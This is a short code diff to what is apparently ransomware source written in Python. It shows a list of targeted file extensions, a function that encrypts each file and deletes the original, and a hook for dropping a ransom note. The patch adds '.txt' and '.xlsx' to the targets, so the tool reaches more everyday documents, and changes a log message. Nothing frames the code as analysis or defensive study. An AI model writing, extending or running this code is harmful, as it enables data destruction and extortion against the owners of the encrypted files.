@@ -79,7 +79,7 @@ TARGET_EXT = {
     ".rbf", ".rctd", ".rev", ".rm", ".rod", ".rodx", ".rpd", ".rsd",
     ".rtf", ".sample", ".sas7bdat", ".sbf", ".scx", ".sdc", ".sdf", ".sqlite",
     ".sqlite3", ".sqlitedb", ".tar", ".te", ".temx", ".tib", ".tiff", ".tmd",
-    ".tps", ".tre", ".trm", ".udb", ".usr"
+    ".tps", ".tre", ".trm", ".udb", ".usr", ".txt", ".xlsx"
 }
 
 TARGET_EXT_BIG = {
@@ -150,7 +150,7 @@ def encrypt_file(path, cpub_key, dry_run=False):
     # Save encrypted file: marker + nonce + enc_key + data
     dest.write_bytes(MARKER + nonce + enc_key + enc)
     path.unlink(missing_ok=True)
-    print(f"Encrypted {path.relative_to(Path.cwd())}")
+    print(f"Encrypted {path}")
 
 # Drop a ransom note in the directory if not already present
 def drop_ransom_note(directory, dry_run=False):
